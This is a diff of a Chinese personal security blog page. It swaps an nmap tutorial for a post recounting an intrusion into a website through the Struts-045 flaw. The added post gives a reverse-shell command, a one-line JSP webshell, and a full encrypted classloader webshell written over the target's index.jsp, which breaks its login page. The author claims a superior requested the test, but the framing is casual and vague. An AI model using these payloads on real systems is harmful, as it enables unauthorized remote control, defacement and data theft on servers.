@@ -5,13 +5,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="namp的使用, wh1te">
-    <meta name="description" content="About nmap
+    <meta name="keywords" content="一次奇妙的渗透, wh1te">
+    <meta name="description" content="About 渗透
 
-About nmap根据最近实际渗透测试的经验总结的，也借鉴了几位网上大佬的讲解，写了下自己的心得。
 
-先对nmap做个了解。     
-0x00 前言nmap是一款网络端口探测/扫描器，在渗透测试以及日站里都有很大">
+前言最近应领导要求，开始疯狂搞站，然后大家各种骚操作齐出，因为我比较菜，就一直扫扫扫，然后就有了今天这个博客，想办法绕过它的防护措施。
+正文一开始，就是使用某扫描器扫出了Struts-045的洞，很开心，就去利用，然后">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@ About nmap根据最近实际渗透测试的经验总结的，也借鉴了几位�
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>namp的使用 | wh1te</title>
+    <title>一次奇妙的渗透 | wh1te</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -192,13 +191,13 @@ About nmap根据最近实际渗透测试的经验总结的，也借鉴了几位�
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        namp的使用
+                        一次奇妙的渗透
                     </div>
                 </div>
             </div>
@@ -313,6 +312,10 @@ About nmap根据最近实际渗透测试的经验总结的，也借鉴了几位�
                     <span class="chip bg-color">Note</span>
                 </a>
                 
+                <a href="/tags/渗透/" target="_blank">
+                    <span class="chip bg-color">渗透</span>
+                </a>
+                
             </div>
             
             <div class="post-info">
@@ -328,47 +331,44 @@ About nmap根据最近实际渗透测试的经验总结的，也借鉴了几位�
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2018-04-23
+                    <i class="fa fa-clock-o fa-fw"></i>2019-09-15
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>About nmap</p>
+                <p>About 渗透</p>
 <a id="more"></a>
-<h2 id="About-nmap"><a href="#About-nmap" class="headerlink" title="About nmap"></a>About nmap</h2><p>根据最近实际渗透测试的经验总结的，也借鉴了几位网上大佬的讲解，写了下自己的心得。</p>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近应领导要求，开始疯狂搞站，然后大家各种骚操作齐出，因为我比较菜，就一直扫扫扫，然后就有了今天这个博客，想办法绕过它的防护措施。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>一开始，就是使用某扫描器扫出了Struts-045的洞，很开心，就去利用，然后发现，利用失败：</p>
+<p><img src="https://i.loli.net/2019/09/15/VvRXYGAfOUISdhr.jpg" alt="image"></p>
+<p>于是，求助于大哥，大哥又发了一份struts2的漏洞利用工具，然后成功了(我真的是R了Dog了，看来有个好用的工具很重要啊)：</p>
+<p><img src="https://i.loli.net/2019/09/15/JZH8LyViUwP7fSd.jpg" alt="image"><br>很开心，可以继续执行命令了，然后发现大哥的工具就是流弊，功能很全啊：</p>
+<p><img src="https://i.loli.net/2019/09/15/RSaOh3oVgTz2qWB.jpg" alt="image"></p>
+<p>一一尝试，WHAT？？？全都不能用，陷入绝望，好在还能执行命令，OK，那就一切都好说，于是乎，我就开始了我一系列的操作。</p>
+<p>先看了下目录下都有哪些文件，然后我是什么权限，权限还行，</p>
+<p><img src="https://i.loli.net/2019/09/15/Q7qA2SrziwVgoUb.jpg" alt="image"></p>
+<p>然后，新建文件，写入webshell：</p>
+<pre><code class="bash">echo &#39;&lt;%eval request(&quot;aa&quot;) %&gt;&#39; &gt; 1.jsp</code></pre>
+<p>发现失败了：</p>
+<p><img src="https://i.loli.net/2019/09/15/D718QvIpxWMCBYT.jpg" alt="image"><img src="https://i.loli.net/2019/09/15/R9w1dBmaoicr2uJ.jpg" alt="image"></p>
+<p>然后往它目录下的123.txt里面写123，成功了:</p>
+<p><img src="https://i.loli.net/2019/09/15/wlOvIGhDyHM1q5b.jpg" alt="image"><br><img src="https://i.loli.net/2019/09/15/JY7ZDa6R2s8CNH1.jpg" alt="image"><br><img src="https://i.loli.net/2019/09/15/8oMNh7mgVvIFTEb.jpg" alt="image"></p>
+<p>写继续往123.txt中写一句话，失败了：</p>
+<p><img src="https://i.loli.net/2019/09/15/gQ5jc32nzmfswCW.jpg" alt="image"><br><img src="https://i.loli.net/2019/09/15/8oMNh7mgVvIFTEb.jpg" alt="image"><br>心中一万头草泥马飞奔而过……</p>
+<p>然而天无绝人之路，一怒之下，直接反弹shell，然后继续写入文件：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><img src="https://i.loli.net/2019/09/15/jqoQ5rCOzGsEuUF.jpg" alt="image"><br><img src="https://i.loli.net/2019/09/15/HsPLtqO1dB2AYeF.jpg" alt="image"><img src="https://i.loli.net/2019/09/15/T74hyd9SKvxsMbL.jpg" alt="image"></p>
+<p>成功了，成功了，成功了。之前的一些敏感操作应该是被waf一类的给拦截了，通过反弹shell ，应该是绕过了waf，也不是很清楚原因……</p>
+<p>然后，更尴尬的事情来了，我写入了webshell，却TM的访问不到，这可咋整，死活找不到自己的webshell。然后，我盯上了他们的主页……</p>
+<p>也就是那个index.jsp，然后就是，小手一抖，shell到手，然后他们的那个登录页面，也就是主页，就么得了……</p>
+<p>看操作：</p>
+<pre><code class="bash">echo &#39;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;&#39; &gt; index.jsp</code></pre>
+<p>然后，主页就开始无限弹窗，至今也不晓得他们的网站是一个什么运作原理……</p>
 <hr>
-<p>先对nmap做个了解。     </p>
-<h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>nmap是一款网络端口探测/扫描器，在渗透测试以及日站里都有很大的作用，在渗透测试中，使用nmap扫描属于信息搜集。<br>nmap可以嗅探出来对方服务器开放的端口(包括服务)，系统类型，也可以对网段进行扫描。<br>总之，比较厉害……   </p>
-<h4 id="0x01-端口"><a href="#0x01-端口" class="headerlink" title="0x01 端口"></a>0x01 端口</h4><p>端口范围：1-65535<br>常见的端口以及服务：<br>21 — ftp协议<br>22 — ssh远程登陆端口(linux)<br>23 — telnet协议<br>25 — 邮箱协议 smtp 发送邮件<br>110 — pop3协议 接收邮件<br>80 — 最常见的web服务端口<br>8080 — java web服务端口<br>5000 — python web服务端口<br>3000 — ruby web服务端口<br>135，445 — 远程连接端口<br>3389 — windows远程连接端口<br>3306 — mysql数据库端口<br>1433 — sql-server数据端口<br>6379 — redis数据库端口<br>我所记得的就这几个了，以后再补充吧。端口，可以理解为服务的窗户，通过端口，你可以使用服务。端口不是固定的，也是可以修改的，修改端口也是安全的一种手段。我碰到过ssh服务在20200端口的。</p>
-<h4 id="0x02-参数"><a href="#0x02-参数" class="headerlink" title="0x02 参数"></a>0x02 参数</h4><p>nmap [选项] [参数]<br>其实就是 nmap 命令 IP<br>常用的参数：<br>-p 指定端口<br>-n 不进行域名的反向解析(ip 解析域名)，加快速度<br>-v 显示详细进度<br>-oX 把扫描结果输出到文件<br>-O 显示主机系统<br>–opne 只显示开启的端口<br>-Pn 直接认为主机是开启的<br>-sS 半开放式扫描(不进行完整的三次握手，只两次)，加快速度，有可能绕过防火墙<br>-sV 然测主机和端口上运行软件的版本<br>-iL 指定主机列表<br>-A 带有攻击性，可能会调用一些攻击脚本。</p>
-<p>在测试中以及平常的使用里，也就这几个了。</p>
-<h4 id="0x03-示例："><a href="#0x03-示例：" class="headerlink" title="0x03 示例："></a>0x03 示例：</h4><p>直接扫描：</p>
-<pre><code class="bash">nmap 10.10.10.10</code></pre>
-<p>指定端口：</p>
-<pre><code class="bash">nmap -p 80 10.10.10.10
-nmap -p 80,90 10.10.10.10</code></pre>
-<p>指定主机列表：</p>
-<pre><code class="bash">nmap -iL nmaptest.txt</code></pre>
-<p>多个ip：</p>
-<pre><code class="bash">nmap 10.10.10.10 10.10.10.11
-nmap 10.10.10.1/24
-nmap 10.10.0.0/16</code></pre>
-<p>组合命令：</p>
-<pre><code class="bash">nmap -n -v -Pn -p 1-65535 10.10.10.10 -o nmap.txt</code></pre>
-<p>命令没有固定的组合形式，根据自己的需要进行选择。探测主机的端口，一般都是可以进行的，跟web漏洞扫描器不一样，nmap一般不会被禁。</p>
-<h4 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h4><p>nmap扫描默认是扫描1000个常用的端口，也不是百分之一百的准确，都有误报的可能。   </p>
-<p>nmap 默认是tcp/SYN扫描，就是先发起一个ping请求(icmp协议),看主机是否开机。Pn可以直接默认主机开机进行扫描，因为通过设置策略，可以禁ping的(比如windows)。tcp的扫描原理，三次握手，四次分手。</p>
-<p>nmap扫描结果，端口状态就三种<br>，open，close，filtered。打开了，关闭了，有防火墙或者其他过滤器或者网络障碍阻止了该端口被访问。还有一种状况，就是扫描出来的所有端口都是开放状态，这种情况，应该就是碰到防火墙，我也不知道要这么解决，你知道了，告诉我一下。</p>
-<p>类似于nmap的扫描器还有zmap,masscan。zmap扫描速度最快误报率最高，nmap扫描准确率最高，但是速度偏慢，masscan二者剧中。</p>
-<p>masscan：</p>
-<pre><code class="bash">masscan -n -v -Pn 10.10.10.10 -oX masscan.txt</code></pre>
-<p>具体的使用，看以后的博客吧，个人感觉nmap使用率是最高的。</p>
-<hr>
-<p>附带上两位大佬的博客：</p>
-<p><a href="https://www.cnblogs.com/hongfei/p/3801357.html" target="_blank" rel="noopener">nmap命令的29个实例</a></p>
-<p><a href="https://www.cnblogs.com/nmap/p/6232969.html" target="_blank" rel="noopener">nmap命令高级用法</a></p>
+<p>PS：出于安全考虑，写博客的时候，已经过了那个测试的阶段了，所以不能再直接写进人家主页了，后来也成功写入了可以访问的文件，拿到了shell，这次渗透就告一段落了～</p>
+<p>之后的博客中会不断更新关于渗透的一些文章，我这博客，随缘可见。</p>
 
             </div>
             <hr/>
@@ -507,7 +507,7 @@ nmap 10.10.0.0/16</code></pre>
                     <span class="reprint-tip">Reprint please specify: </span>
                     <a href="http://yoursite.com" class="b-link-green">wh1te</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2018/04/23/nmap/" class="b-link-green">namp的使用</a>
+                    <a href="/2019/09/15/一次奇妙的渗透/" class="b-link-green">一次奇妙的渗透</a>
                 </p>
             </div>
         </div>
@@ -528,27 +528,83 @@ nmap 10.10.0.0/16</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">Previous</div>
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">Current</div>
             <div class="card">
-                <a href="/2018/05/10/masscan/">
+                <a href="/2019/09/15/一次奇妙的渗透/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="masscan的使用">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="一次奇妙的渗透">
                         
-                        <span class="card-title">masscan的使用</span>
+                        <span class="card-title">一次奇妙的渗透</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">About masscan basic knowledge
+                    <div class="summary">About 渗透
 
-About masscan
-0x00 前言masscan的使用类似于nmap，其实也不用分开写，参数什么的也都差不多，只不过masscan比nmap更快一些，当扫描的ip数量比较</div>
+
+前言最近应领导要求，开始疯狂搞站，然后大家各种骚操作齐出，因为我比较菜，就一直扫扫扫，然后就有了今天这个博客，想办法绕过它的防护措施。
+正文一开始，就是使用某扫描器扫出了Struts-045的洞，很开心，就去利用，然后</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-05-10
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Skill/" class="post-category" target="_blank">
+                                    Skill
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Note/" target="_blank">
+                        <span class="chip bg-color">Note</span>
+                    </a>
+                    
+                    <a href="/tags/渗透/" target="_blank">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">Next</div>
+            <div class="card">
+                <a href="/2019/09/14/phpsploit的使用/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="phpsploit的使用">
+                        
+                        <span class="card-title">phpsploit的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">About TOOLS
+
+
+
+
+前言除了中国菜刀，CKnife，冰蝎以外，最近又在用一款比较骚的后门管理工具，早就出来了，最近才在用，功能也比较齐全，使用命令后进行操作，这里做一个简单的记录。
+正文这里先放上工具的地址：phpsploit
+</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -568,51 +624,8 @@ About masscan
                         <span class="chip bg-color">Note</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">Next</div>
-            <div class="card">
-                <a href="/2018/04/23/wireshark的使用/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="wireshark的使用">
-                        
-                        <span class="card-title">wireshark的使用</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary">About wireshark
-
-About wireshark网上有很多关于wiresahrk的使用教程，我只针对我做过的CTF题目提出自己的见解。如有不足，请指出。
-
-一般来说，先打开流量包看一看，大致都有什么流量。然后再尝试导出或者直</div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-04-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Skill/" class="post-category" target="_blank">
-                                    Skill
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Note/" target="_blank">
-                        <span class="chip bg-color">Note</span>
+                    <a href="/tags/Tools/" target="_blank">
+                        <span class="chip bg-color">Tools</span>
                     </a>
                     
                 </div>
